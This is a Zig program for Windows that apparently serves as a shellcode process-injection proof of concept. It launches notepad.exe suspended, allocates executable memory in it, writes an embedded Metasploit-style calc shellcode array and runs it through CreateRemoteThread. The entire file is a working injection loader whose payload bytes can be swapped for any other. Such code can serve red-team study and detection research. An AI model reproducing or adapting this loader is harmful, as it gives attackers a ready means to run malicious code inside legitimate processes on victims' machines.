const std = @import("std");
const win = std.os.windows;
const unicode = std.unicode;

// Define CREATE_SUSPENDED constant manually
const CREATE_SUSPENDED = 0x00000004;

// External function declarations
extern "kernel32" fn CreateRemoteThread(
    hProcess: win.HANDLE,
    lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
    dwStackSize: win.SIZE_T,
    lpStartAddress: win.LPTHREAD_START_ROUTINE,
    lpParameter: ?win.LPVOID,
    dwCreationFlags: win.DWORD,
    lpThreadId: ?*win.DWORD,
) callconv(win.WINAPI) ?win.HANDLE;

extern "kernel32" fn CreateProcessW(
    lpApplicationName: ?win.LPCWSTR,
    lpCommandLine: ?win.LPWSTR,
    lpProcessAttributes: ?*win.SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
    bInheritHandles: win.BOOL,
    dwCreationFlags: win.DWORD,
    lpEnvironment: ?win.LPVOID,
    lpCurrentDirectory: ?win.LPCWSTR,
    lpStartupInfo: *win.STARTUPINFOW,
    lpProcessInformation: *win.PROCESS_INFORMATION,
) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn OpenProcess(
    dwDesiredAccess: win.DWORD,
    bInheritHandle: win.BOOL,
    dwProcessId: win.DWORD,
) callconv(win.WINAPI) ?win.HANDLE;

extern "kernel32" fn VirtualAllocEx(
    hProcess: win.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: win.DWORD,
    flProtect: win.DWORD,
) callconv(win.WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: win.HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: [*]const u8,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn ResumeThread(hThread: win.HANDLE) callconv(win.WINAPI) win.DWORD;

pub fn main() !void {
    // Shellcode (64 bit metasploit calc)
    const shellcode = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };

    const alloc: std.mem.Allocator = std.heap.page_allocator;

    // Create UTF-16 command line for `notepad.exe`
    const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, "notepad.exe");
    defer alloc.free(wide_cmd_line);

    // Initialize process startup info
    var startup_info: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
    startup_info.cb = @sizeOf(win.STARTUPINFOW);
    var process_info: win.PROCESS_INFORMATION = undefined;

    // Create `notepad.exe` in a suspended state
    const creation_result = CreateProcessW(
        null,
        wide_cmd_line.ptr,
        null,
        null,
        win.FALSE,
        CREATE_SUSPENDED, // Use the manually defined constant
        null,
        null,
        &startup_info,
        &process_info,
    );

    if (creation_result == 0) {
        std.debug.print("[+] CreateProcessW failed: {}\n", .{win.kernel32.GetLastError()});
        return error.CreateProcessFailed;
    }
    defer {
        _ = win.CloseHandle(process_info.hProcess);
        _ = win.CloseHandle(process_info.hThread);
    }

    std.debug.print("[+] Process ID: {}\n", .{process_info.dwProcessId});
    std.debug.print("[+] Process Handle: 0x{x}\n", .{@intFromPtr(process_info.hProcess)});
    std.debug.print("[+] Thread Handle: 0x{x}\n", .{@intFromPtr(process_info.hThread)});

    // Allocate memory in the remote process for shellcode
    const remote_buffer = VirtualAllocEx(
        process_info.hProcess,
        null,
        shellcode.len,
        win.MEM_COMMIT | win.MEM_RESERVE,
        win.PAGE_EXECUTE_READWRITE,
    ) orelse {
        std.debug.print("VirtualAllocEx failed: {}\n", .{win.kernel32.GetLastError()});
        return error.VirtualAllocExFailed;
    };

    std.debug.print("[+] Allocated memory address: 0x{x}\n", .{@intFromPtr(remote_buffer)});

    // Write the shellcode into the allocated memory in the remote process
    var bytes_written: usize = undefined;
    const write_result = WriteProcessMemory(
        process_info.hProcess,
        remote_buffer,
        &shellcode,
        shellcode.len,
        &bytes_written,
    );

    if (write_result == 0) {
        std.debug.print("WriteProcessMemory failed: {}\n", .{win.kernel32.GetLastError()});
        return error.WriteProcessMemoryFailed;
    }

    std.debug.print("[+] Successfully wrote {} bytes to the target process.\n", .{bytes_written});

    // Create a remote thread in the suspended process for the shellcode
    const thread_handle = CreateRemoteThread(process_info.hProcess, // Handle to the target process
        null, // Default security attributes
        0, // Default stack size
        @ptrCast(remote_buffer), // Start address (pointer to the shellcode)
        null, // No parameters passed to the thread
        0, // No creation flags
        null // No thread identifier needed
    ) orelse {
        std.debug.print("CreateRemoteThread failed: {}\n", .{win.kernel32.GetLastError()});
        return error.CreateRemoteThreadFailed;
    };

    defer _ = win.CloseHandle(thread_handle);

    std.debug.print("[+] Remote thread created. Handle: 0x{x}\n", .{@intFromPtr(thread_handle)});

    // Resume the suspended thread to execute the shellcode
    _ = ResumeThread(thread_handle);

    std.debug.print("[+] Resumed thread for shellcode execution.\n", .{});
}
